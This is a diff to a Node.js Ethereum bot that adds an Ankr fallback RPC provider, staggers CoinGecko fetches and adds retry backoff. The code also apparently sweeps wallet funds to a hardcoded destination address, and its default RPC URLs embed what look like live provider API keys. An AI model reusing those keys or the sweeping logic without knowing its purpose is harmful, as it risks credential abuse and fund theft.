@@ -24,9 +24,11 @@ const fs  = require("fs");
 
 const PRIVATE_KEY               = process.env.PRIVATE_KEY;
 const WS_URL = process.env.WS_URL
-  || "wss://divine-restless-dew.ethereum-mainnet.quiknode.pro/aa6c5955642c629e0cf8d789d463ec0c00de16a6/";
+  || "wss://compatible-ancient-star.ethereum-mainnet.quiknode.pro/1262afd4baa3b6c0ac57d2091d1567c56faf83c4/";
 const RPC_URL = process.env.RPC_URL
-  || "https://divine-restless-dew.ethereum-mainnet.quiknode.pro/aa6c5955642c629e0cf8d789d463ec0c00de16a6/";
+  || "https://compatible-ancient-star.ethereum-mainnet.quiknode.pro/1262afd4baa3b6c0ac57d2091d1567c56faf83c4/";
+const FALLBACK_RPC_URL = process.env.FALLBACK_RPC_URL
+  || "https://rpc.ankr.com/eth/be1f5c60681efe39652195480d36e5411f8692d17f0679757cb2c06f8bc8f504";
 const CONTRACT_ADDRESS          = process.env.CONTRACT_ADDRESS;
 const DESTINATION_ADDRESS       = process.env.DESTINATION_ADDRESS || "0x8Da0f664bb5091585148333275FcF0607b258026";
 const TOKENS_TO_WATCH           = (process.env.TOKENS_TO_WATCH || "").split(",").filter(Boolean);
@@ -41,7 +43,10 @@ const MIN_TOKEN_UNITS      = "0.5";
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
 // Stagger CoinGecko startup fetch to avoid hitting rate limits when all bots start
-const CG_STAGGER_MS = { eth: 0, bnb: 10_000, polygon: 20_000 };
+// Stagger CoinGecko startup fetches so all 3 bots never overlap.
+// ETH makes 3 API calls (~10s total); BNB waits for ETH to finish + 5s buffer;
+// Polygon waits for BNB to finish + 5s buffer.
+const CG_STAGGER_MS = { eth: 0, bnb: 45_000, polygon: 90_000 };
 const TOKEN_CALL_DELAY     = 50;      // ms after each token call
 // Minimum relayer balance — if below this, skip ALL sweeps to avoid failed txs
 const RELAYER_MIN_WEI      = ethers.parseEther("0.005"); // 0.005 ETH
@@ -79,7 +84,17 @@ if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
 // wsProvider  — WebSocket for block events ONLY; recreated on disconnect
 //               NEVER passed to a Contract or Wallet
 
-const rpcProvider = new ethers.JsonRpcProvider(RPC_URL);
+// Primary HTTP provider for all balance/fee/tx calls.
+// Falls back to Ankr automatically via FallbackProvider (quorum=1 means
+// whichever responds first wins; no doubling of calls under normal conditions).
+const _rpcPrimary  = new ethers.JsonRpcProvider(RPC_URL);
+const _rpcFallback = new ethers.JsonRpcProvider(FALLBACK_RPC_URL);
+const rpcProvider  = new ethers.FallbackProvider(
+  [{ provider: _rpcPrimary, priority: 1, weight: 1, stallTimeout: 2500 },
+   { provider: _rpcFallback, priority: 2, weight: 1, stallTimeout: 2500 }],
+  null,
+  { quorum: 1 },
+);
 
 const supabase = SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY
   ? createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, {
@@ -1030,17 +1045,20 @@ async function sweepGaslessWallet(walletAddress) {
 // ── CoinGecko token list ──────────────────────────────────────────────────────
 
 async function cgFetchWithRetry(url) {
-  for (let attempt = 0; attempt < 2; attempt++) {
+  const BACKOFF = [30_000, 60_000, 120_000]; // 30s → 60s → 120s
+  for (let attempt = 0; attempt <= BACKOFF.length; attempt++) {
     const res = await fetch(url);
     if (res.status === 429) {
-      log("[tokens] rate limited (429) — waiting 60s before retry");
-      await sleep(60_000);
+      if (attempt >= BACKOFF.length) throw new Error(`CoinGecko still rate-limited after ${attempt + 1} attempts`);
+      const wait = BACKOFF[attempt];
+      log(`[tokens] rate limited (429) — waiting ${wait / 1000}s before retry (attempt ${attempt + 1})`);
+      await sleep(wait);
       continue;
     }
     if (!res.ok) throw new Error(`CoinGecko ${res.status} for ${url}`);
     return res.json();
   }
-  throw new Error(`CoinGecko still rate-limited after retry`);
+  throw new Error(`CoinGecko fetch failed`);
 }
 
 async function fetchTokenList(chain) {
